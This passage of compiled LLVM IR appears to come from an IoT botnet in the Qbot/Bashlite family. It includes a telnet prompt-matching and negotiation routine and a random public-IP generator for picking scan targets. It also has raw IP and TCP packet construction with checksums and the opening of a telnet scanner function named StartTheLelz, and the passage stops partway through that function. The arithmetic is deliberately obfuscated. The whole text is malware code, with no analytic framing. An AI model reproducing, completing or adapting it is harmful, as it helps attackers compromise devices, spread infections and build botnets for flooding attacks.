  %82 = call i32 @select(i32 %80, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %83 = icmp slt i32 %82, 1
  br i1 %83, label %84, label %85

; <label>:84:                                     ; preds = %63
  br label %152

; <label>:85:                                     ; preds = %63
  %86 = load i8*, i8** %15, align 8
  %87 = load i32, i32* %18, align 4
  %88 = sext i32 %87 to i64
  %89 = getelementptr inbounds i8, i8* %86, i64 %88
  store i8* %89, i8** %23, align 8
  %90 = load i32, i32* %10, align 4
  %91 = load i8*, i8** %23, align 8
  %92 = call i64 @recv(i32 %90, i8* %91, i64 1, i32 0)
  %93 = trunc i64 %92 to i32
  store i32 %93, i32* %19, align 4
  %94 = load i32, i32* %19, align 4
  %95 = icmp eq i32 %94, -1
  br i1 %95, label %99, label %96

; <label>:96:                                     ; preds = %85
  %97 = load i32, i32* %19, align 4
  %98 = icmp eq i32 %97, 0
  br i1 %98, label %99, label %100

; <label>:99:                                     ; preds = %96, %85
  store i32 0, i32* %9, align 4
  br label %157

; <label>:100:                                    ; preds = %96
  %101 = load i32, i32* %19, align 4
  %102 = load i32, i32* %18, align 4
  %103 = sub i32 0, %102
  %104 = sub i32 0, %101
  %105 = add i32 %103, %104
  %106 = sub i32 0, %105
  %107 = add nsw i32 %102, %101
  store i32 %106, i32* %18, align 4
  %108 = load i8*, i8** %23, align 8
  %109 = load i8, i8* %108, align 1
  %110 = zext i8 %109 to i32
  %111 = icmp eq i32 %110, 255
  br i1 %111, label %112, label %137

; <label>:112:                                    ; preds = %100
  %113 = load i32, i32* %10, align 4
  %114 = load i8*, i8** %23, align 8
  %115 = getelementptr inbounds i8, i8* %114, i64 1
  %116 = call i64 @recv(i32 %113, i8* %115, i64 2, i32 0)
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  %118 = load i32, i32* %19, align 4
  %119 = icmp eq i32 %118, -1
  br i1 %119, label %123, label %120

; <label>:120:                                    ; preds = %112
  %121 = load i32, i32* %19, align 4
  %122 = icmp eq i32 %121, 0
  br i1 %122, label %123, label %124

; <label>:123:                                    ; preds = %120, %112
  store i32 0, i32* %9, align 4
  br label %157

; <label>:124:                                    ; preds = %120
  %125 = load i32, i32* %19, align 4
  %126 = load i32, i32* %18, align 4
  %127 = sub i32 %126, -58203561
  %128 = add i32 %127, %125
  %129 = add i32 %128, -58203561
  %130 = add nsw i32 %126, %125
  store i32 %129, i32* %18, align 4
  %131 = load i32, i32* %10, align 4
  %132 = load i8*, i8** %23, align 8
  %133 = call i32 @negotiate(i32 %131, i8* %132, i32 3)
  %134 = icmp ne i32 %133, 0
  br i1 %134, label %136, label %135

; <label>:135:                                    ; preds = %124
  store i32 0, i32* %9, align 4
  br label %157

; <label>:136:                                    ; preds = %124
  br label %151

; <label>:137:                                    ; preds = %100
  %138 = load i8*, i8** %15, align 8
  %139 = load i8*, i8** %11, align 8
  %140 = call i8* @strstr(i8* %138, i8* %139) #10
  %141 = icmp ne i8* %140, null
  br i1 %141, label %149, label %142

; <label>:142:                                    ; preds = %137
  %143 = load i32, i32* %12, align 4
  %144 = icmp ne i32 %143, 0
  br i1 %144, label %145, label %150

; <label>:145:                                    ; preds = %142
  %146 = load i8*, i8** %15, align 8
  %147 = call i32 @matchPrompt(i8* %146)
  %148 = icmp ne i32 %147, 0
  br i1 %148, label %149, label %150

; <label>:149:                                    ; preds = %145, %137
  store i32 1, i32* %20, align 4
  br label %152

; <label>:150:                                    ; preds = %145, %142
  br label %151

; <label>:151:                                    ; preds = %150, %136
  br label %33

; <label>:152:                                    ; preds = %149, %84, %51
  %153 = load i32, i32* %20, align 4
  %154 = icmp ne i32 %153, 0
  br i1 %154, label %155, label %156

; <label>:155:                                    ; preds = %152
  store i32 1, i32* %9, align 4
  br label %157

; <label>:156:                                    ; preds = %152
  store i32 0, i32* %9, align 4
  br label %157

; <label>:157:                                    ; preds = %156, %155, %135, %123, %99
  %158 = load i32, i32* %9, align 4
  ret i32 %158
}

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomPublicIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [16 x i8], align 16
  %3 = alloca [16 x i8], align 16
  %4 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %5 = zext i8 %4 to i32
  %6 = icmp sgt i32 %5, 0
  br i1 %6, label %7, label %29

; <label>:7:                                      ; preds = %0
  %8 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %9 = zext i8 %8 to i32
  %10 = icmp slt i32 %9, 255
  br i1 %10, label %11, label %29

; <label>:11:                                     ; preds = %7
  %12 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %13 = sub i8 0, 1
  %14 = sub i8 %12, %13
  %15 = add i8 %12, 1
  store i8 %14, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %16 = bitcast [16 x i8]* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* %16, i8 0, i64 16, i32 16, i1 false)
  %17 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %18 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %19 = zext i8 %18 to i32
  %20 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %21 = zext i8 %20 to i32
  %22 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  %25 = zext i8 %24 to i32
  %26 = call i32 (i8*, i8*, ...) @szprintf(i8* %17, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.23, i32 0, i32 0), i32 %19, i32 %21, i32 %23, i32 %25)
  %27 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %28 = call i32 @inet_addr(i8* %27) #2
  store i32 %28, i32* %1, align 4
  br label %179

; <label>:29:                                     ; preds = %7, %0
  %30 = call i32 @rand() #2
  %31 = srem i32 %30, 255
  %32 = trunc i32 %31 to i8
  store i8 %32, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %33 = call i32 @rand() #2
  %34 = srem i32 %33, 255
  %35 = trunc i32 %34 to i8
  store i8 %35, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %36 = call i32 @rand() #2
  %37 = srem i32 %36, 255
  %38 = trunc i32 %37 to i8
  store i8 %38, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  store i8 0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 4), align 1
  br label %39

; <label>:39:                                     ; preds = %157, %29
  %40 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 0
  br i1 %42, label %155, label %43

; <label>:43:                                     ; preds = %39
  %44 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %45 = zext i8 %44 to i32
  %46 = icmp eq i32 %45, 10
  br i1 %46, label %155, label %47

; <label>:47:                                     ; preds = %43
  %48 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 100
  br i1 %50, label %51, label %59

; <label>:51:                                     ; preds = %47
  %52 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %53 = zext i8 %52 to i32
  %54 = icmp sge i32 %53, 64
  br i1 %54, label %55, label %59

; <label>:55:                                     ; preds = %51
  %56 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %57 = zext i8 %56 to i32
  %58 = icmp sle i32 %57, 127
  br i1 %58, label %155, label %59

; <label>:59:                                     ; preds = %55, %51, %47
  %60 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %61 = zext i8 %60 to i32
  %62 = icmp eq i32 %61, 127
  br i1 %62, label %155, label %63

; <label>:63:                                     ; preds = %59
  %64 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %65 = zext i8 %64 to i32
  %66 = icmp eq i32 %65, 169
  br i1 %66, label %67, label %71

; <label>:67:                                     ; preds = %63
  %68 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %69 = zext i8 %68 to i32
  %70 = icmp eq i32 %69, 254
  br i1 %70, label %155, label %71

; <label>:71:                                     ; preds = %67, %63
  %72 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %73 = zext i8 %72 to i32
  %74 = icmp eq i32 %73, 172
  br i1 %74, label %75, label %83

; <label>:75:                                     ; preds = %71
  %76 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %77 = zext i8 %76 to i32
  %78 = icmp sle i32 %77, 16
  br i1 %78, label %79, label %83

; <label>:79:                                     ; preds = %75
  %80 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %81 = zext i8 %80 to i32
  %82 = icmp sle i32 %81, 31
  br i1 %82, label %155, label %83

; <label>:83:                                     ; preds = %79, %75, %71
  %84 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %85 = zext i8 %84 to i32
  %86 = icmp eq i32 %85, 192
  br i1 %86, label %87, label %95

; <label>:87:                                     ; preds = %83
  %88 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %89 = zext i8 %88 to i32
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %95

; <label>:91:                                     ; preds = %87
  %92 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %93 = zext i8 %92 to i32
  %94 = icmp eq i32 %93, 2
  br i1 %94, label %155, label %95

; <label>:95:                                     ; preds = %91, %87, %83
  %96 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %97 = zext i8 %96 to i32
  %98 = icmp eq i32 %97, 192
  br i1 %98, label %99, label %107

; <label>:99:                                     ; preds = %95
  %100 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %101 = zext i8 %100 to i32
  %102 = icmp eq i32 %101, 88
  br i1 %102, label %103, label %107

; <label>:103:                                    ; preds = %99
  %104 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %105 = zext i8 %104 to i32
  %106 = icmp eq i32 %105, 99
  br i1 %106, label %155, label %107

; <label>:107:                                    ; preds = %103, %99, %95
  %108 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %109 = zext i8 %108 to i32
  %110 = icmp eq i32 %109, 192
  br i1 %110, label %111, label %115

; <label>:111:                                    ; preds = %107
  %112 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %113 = zext i8 %112 to i32
  %114 = icmp eq i32 %113, 168
  br i1 %114, label %155, label %115

; <label>:115:                                    ; preds = %111, %107
  %116 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 198
  br i1 %118, label %119, label %127

; <label>:119:                                    ; preds = %115
  %120 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %121 = zext i8 %120 to i32
  %122 = icmp eq i32 %121, 18
  br i1 %122, label %155, label %123

; <label>:123:                                    ; preds = %119
  %124 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %125 = zext i8 %124 to i32
  %126 = icmp eq i32 %125, 19
  br i1 %126, label %155, label %127

; <label>:127:                                    ; preds = %123, %115
  %128 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %129 = zext i8 %128 to i32
  %130 = icmp eq i32 %129, 198
  br i1 %130, label %131, label %139

; <label>:131:                                    ; preds = %127
  %132 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %133 = zext i8 %132 to i32
  %134 = icmp eq i32 %133, 51
  br i1 %134, label %135, label %139

; <label>:135:                                    ; preds = %131
  %136 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %137 = zext i8 %136 to i32
  %138 = icmp eq i32 %137, 100
  br i1 %138, label %155, label %139

; <label>:139:                                    ; preds = %135, %131, %127
  %140 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %141 = zext i8 %140 to i32
  %142 = icmp eq i32 %141, 203
  br i1 %142, label %143, label %151

; <label>:143:                                    ; preds = %139
  %144 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %145 = zext i8 %144 to i32
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %151

; <label>:147:                                    ; preds = %143
  %148 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %149 = zext i8 %148 to i32
  %150 = icmp eq i32 %149, 113
  br i1 %150, label %155, label %151

; <label>:151:                                    ; preds = %147, %143, %139
  %152 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %153 = zext i8 %152 to i32
  %154 = icmp sge i32 %153, 224
  br label %155

; <label>:155:                                    ; preds = %151, %147, %135, %123, %119, %111, %103, %91, %79, %67, %59, %55, %43, %39
  %156 = phi i1 [ true, %147 ], [ true, %135 ], [ true, %123 ], [ true, %119 ], [ true, %111 ], [ true, %103 ], [ true, %91 ], [ true, %79 ], [ true, %67 ], [ true, %59 ], [ true, %55 ], [ true, %43 ], [ true, %39 ], [ %154, %151 ]
  br i1 %156, label %157, label %167

; <label>:157:                                    ; preds = %155
  %158 = call i32 @rand() #2
  %159 = srem i32 %158, 255
  %160 = trunc i32 %159 to i8
  store i8 %160, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %161 = call i32 @rand() #2
  %162 = srem i32 %161, 255
  %163 = trunc i32 %162 to i8
  store i8 %163, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %164 = call i32 @rand() #2
  %165 = srem i32 %164, 255
  %166 = trunc i32 %165 to i8
  store i8 %166, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %39

; <label>:167:                                    ; preds = %155
  %168 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %168, i8 0, i64 16, i32 16, i1 false)
  %169 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %170 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %171 = zext i8 %170 to i32
  %172 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %173 = zext i8 %172 to i32
  %174 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %175 = zext i8 %174 to i32
  %176 = call i32 (i8*, i8*, ...) @szprintf(i8* %169, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.24, i32 0, i32 0), i32 %171, i32 %173, i32 %175)
  %177 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %178 = call i32 @inet_addr(i8* %177) #2
  store i32 %178, i32* %1, align 4
  br label %179

; <label>:179:                                    ; preds = %167, %11
  %180 = load i32, i32* %1, align 4
  ret i32 %180
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 1884392513, -1
  %10 = or i32 %7, %8
  %11 = or i32 1884392513, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 -1, %18
  %20 = xor i32 -1, -1
  %21 = and i32 %17, %20
  %22 = or i32 %19, %21
  %23 = xor i32 %17, -1
  %24 = xor i32 %16, -1
  %25 = xor i32 %22, -1
  %26 = xor i32 1600721750, -1
  %27 = or i32 %24, %25
  %28 = or i32 1600721750, %26
  %29 = xor i32 %27, -1
  %30 = and i32 %29, %28
  %31 = and i32 %16, %22
  %32 = xor i32 %15, -1
  %33 = and i32 %30, %32
  %34 = xor i32 %30, -1
  %35 = and i32 %15, %34
  %36 = or i32 %33, %35
  %37 = xor i32 %15, %30
  ret i32 %36
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, 855496286614740940
  %16 = add i64 %15, %13
  %17 = sub i64 %16, 855496286614740940
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  %19 = load i32, i32* %4, align 4
  %20 = add i32 %19, 1740500582
  %21 = sub i32 %20, 2
  %22 = sub i32 %21, 1740500582
  %23 = sub nsw i32 %19, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp sgt i32 %25, 0
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = bitcast i16* %28 to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  br label %37

; <label>:37:                                     ; preds = %41, %36
  %38 = load i64, i64* %5, align 8
  %39 = lshr i64 %38, 16
  %40 = icmp ne i64 %39, 0
  br i1 %40, label %41, label %58

; <label>:41:                                     ; preds = %37
  %42 = load i64, i64* %5, align 8
  %43 = xor i64 %42, -1
  %44 = xor i64 65535, -1
  %45 = xor i64 3808461127074230764, -1
  %46 = or i64 %43, %44
  %47 = or i64 3808461127074230764, %45
  %48 = xor i64 %46, -1
  %49 = and i64 %48, %47
  %50 = and i64 %42, 65535
  %51 = load i64, i64* %5, align 8
  %52 = lshr i64 %51, 16
  %53 = sub i64 0, %49
  %54 = sub i64 0, %52
  %55 = add i64 %53, %54
  %56 = sub i64 0, %55
  %57 = add i64 %49, %52
  store i64 %56, i64* %5, align 8
  br label %37

; <label>:58:                                     ; preds = %37
  %59 = load i64, i64* %5, align 8
  %60 = xor i64 %59, -1
  %61 = and i64 5579387032550035011, %60
  %62 = xor i64 5579387032550035011, -1
  %63 = and i64 %59, %62
  %64 = xor i64 -1, -1
  %65 = and i64 %64, 5579387032550035011
  %66 = and i64 -1, %62
  %67 = or i64 %61, %63
  %68 = or i64 %65, %66
  %69 = xor i64 %67, %68
  %70 = xor i64 %59, -1
  %71 = trunc i64 %69 to i16
  ret i16 %71
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
  %30 = bitcast i8* %29 to i16*
  store i16* %30, i16** %8, align 8
  %31 = load i16*, i16** %8, align 8
  %32 = bitcast i16* %31 to i8*
  %33 = bitcast %struct.tcp_pseudo* %5 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %32, i8* %33, i64 24, i32 1, i1 false)
  %34 = load i16*, i16** %8, align 8
  %35 = bitcast i16* %34 to i8*
  %36 = getelementptr inbounds i8, i8* %35, i64 24
  %37 = load %struct.tcphdr*, %struct.tcphdr** %4, align 8
  %38 = bitcast %struct.tcphdr* %37 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %36, i8* %38, i64 20, i32 1, i1 false)
  %39 = load i16*, i16** %8, align 8
  %40 = load i32, i32* %7, align 4
  %41 = call zeroext i16 @csum(i16* %39, i32 %40)
  store i16 %41, i16* %9, align 2
  %42 = load i16*, i16** %8, align 8
  %43 = bitcast i16* %42 to i8*
  call void @free(i8* %43) #2
  %44 = load i16, i16* %9, align 2
  ret i16 %44
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = xor i8 -16, -1
  %15 = xor i8 %13, %14
  %16 = and i8 %15, %13
  %17 = and i8 %13, -16
  %18 = xor i8 %16, -1
  %19 = xor i8 5, -1
  %20 = xor i8 110, -1
  %21 = and i8 %18, 110
  %22 = and i8 %16, %20
  %23 = and i8 %19, 110
  %24 = and i8 5, %20
  %25 = or i8 %21, %22
  %26 = or i8 %23, %24
  %27 = xor i8 %25, %26
  %28 = or i8 %18, %19
  %29 = xor i8 %28, -1
  %30 = or i8 110, %20
  %31 = and i8 %29, %30
  %32 = or i8 %27, %31
  %33 = or i8 %16, 5
  store i8 %32, i8* %12, align 4
  %34 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %35 = bitcast %struct.iphdr* %34 to i8*
  %36 = load i8, i8* %35, align 4
  %37 = xor i8 %36, -1
  %38 = xor i8 15, -1
  %39 = xor i8 -71, -1
  %40 = or i8 %37, %38
  %41 = or i8 -71, %39
  %42 = xor i8 %40, -1
  %43 = and i8 %42, %41
  %44 = and i8 %36, 15
  %45 = and i8 %43, 64
  %46 = xor i8 %43, 64
  %47 = or i8 %45, %46
  %48 = or i8 %43, 64
  store i8 %47, i8* %35, align 4
  %49 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %50 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %49, i32 0, i32 1
  store i8 0, i8* %50, align 1
  %51 = load i32, i32* %10, align 4
  %52 = sext i32 %51 to i64
  %53 = sub i64 20, -5946176778250871442
  %54 = add i64 %53, %52
  %55 = add i64 %54, -5946176778250871442
  %56 = add i64 20, %52
  %57 = trunc i64 %55 to i16
  %58 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %59 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %58, i32 0, i32 2
  store i16 %57, i16* %59, align 2
  %60 = call i32 @rand_cmwc()
  %61 = trunc i32 %60 to i16
  %62 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %63 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %62, i32 0, i32 3
  store i16 %61, i16* %63, align 4
  %64 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %65 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %64, i32 0, i32 4
  store i16 0, i16* %65, align 2
  %66 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %67 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %66, i32 0, i32 5
  store i8 -1, i8* %67, align 4
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %70 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %69, i32 0, i32 6
  store i8 %68, i8* %70, align 1
  %71 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 7
  store i16 0, i16* %72, align 2
  %73 = load i32, i32* %8, align 4
  %74 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %75 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %74, i32 0, i32 8
  store i32 %73, i32* %75, align 4
  %76 = load i32, i32* %7, align 4
  %77 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %78 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %77, i32 0, i32 9
  store i32 %76, i32* %78, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %10

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* %3, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* %2, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %6
  %11 = load i32, i32* %2, align 4
  ret i32 %11
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i8*, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %16 = call i32 @getdtablesize() #2
  %17 = sdiv i32 %16, 4
  %18 = mul nsw i32 %17, 3
  store i32 %18, i32* %3, align 4
  %19 = load i32, i32* %3, align 4
